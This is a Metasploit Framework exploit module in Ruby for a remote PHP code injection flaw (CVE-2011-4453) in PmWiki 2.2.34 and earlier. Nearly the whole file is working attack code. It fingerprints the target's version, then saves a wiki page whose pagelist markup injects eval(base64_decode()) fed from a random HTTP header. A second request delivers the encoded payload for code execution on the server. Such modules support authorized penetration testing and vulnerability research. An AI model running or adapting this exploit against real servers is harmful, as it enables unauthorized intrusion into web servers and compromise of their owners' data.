# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PmWiki <= 2.2.34 (pagelist) Remote PHP Code Injection Exploit&#039;,
            &#039;Description&#039;    => %q{
                This module exploits an arbitrary command execution vulnerability
                in PmWiki from 2.0.0 to 2.2.34. The vulnerable function is
                inside /scripts/pagelist.php.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;EgiX&#039;,  # Vulnerability discovery and exploit
                    &#039;TecR0c&#039; # Metasploit Module
                ],
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-4453&#039;],
                    [&#039;BID&#039;, &#039;50776&#039;],
                    [&#039;OSVDB&#039;, &#039;77261&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18149/&#039;],
                    [&#039;URL&#039;, &#039;http://www.pmwiki.org/wiki/PITS/01271&#039;]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Keys&#039;        => [&#039;php&#039;],
                    &#039;Space&#039;       => 4000,
                    &#039;DisableNops&#039; => true,
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[&#039;Automatic&#039;,{}]],
            &#039;DisclosureDate&#039; => &#039;Nov 09 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;URI&#039;,[true, "The path to the pmwiki installation", "/"]),
            ],self.class)
    end
 
    def check
        uri = datastore[&#039;URI&#039;]
        uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? &#039;pmwiki.php?n=PmWiki.Version&#039; : &#039;/pmwiki.php?n=PmWiki.Version&#039;
 
        res = send_request_raw(
            {
                &#039;uri&#039; => uri
            }, 25)
 
        if (res and res.body =~ /pmwiki-2.[0.00-2.34]/)
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        p = Rex::Text.encode_base64(payload.encoded)
        header = rand_text_alpha_upper(3)
        header_append = rand_text_alpha_upper(4)
 
        uri = datastore[&#039;URI&#039;]
        uri += (datastore[&#039;URI&#039;][-1, 1] == "/") ? &#039;pmwiki.php&#039; : &#039;/pmwiki.php&#039;
 
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => uri,
            &#039;vars_post&#039; =>
                {
                    &#039;action&#039; => &#039;edit&#039;,
                    &#039;post&#039; => &#039;save&#039;,
                    &#039;n&#039; => "#{header}.#{header_append}",
                    &#039;text&#039; => "(:pagelist order=&#039;]);error_reporting(0);eval(base64_decode($_SERVER[HTTP_#{header}]));die;#:)",
                }
            }, 25)
 
        res = send_request_cgi({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => uri,
            &#039;headers&#039; =>
                {
                    header => p,
                    &#039;Connection&#039; => &#039;Close&#039;,
                },
            &#039;vars_post&#039; =>
                {
                    &#039;n&#039; => "#{header}.#{header_append}",
                }
        }, 25)
    end
end



